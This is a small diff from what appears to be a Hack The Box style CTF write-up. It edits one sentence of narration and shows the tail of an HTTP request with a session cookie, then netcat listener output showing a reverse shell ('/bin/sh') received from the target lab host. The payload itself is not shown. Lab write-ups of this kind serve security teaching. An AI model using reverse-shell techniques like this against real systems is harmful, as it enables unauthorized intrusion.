@@ -252,7 +252,7 @@ Cookie: session=eyJ1c2VyX2lkIjo4LCJ1c2VybmFtZSI6ImhhY2tlckBodGIuY29tIn0.aJ9_0w.t
 Connection: keep-alive
 ```
 
-I get a connection on the netcat listener:
+The payload is executed and I get a connection on the netcat listener:
 ```
 connect to [10.10.14.9] from (UNKNOWN) [10.10.11.74] 56218
 /bin/sh: 0: can't access tty; job control turned off
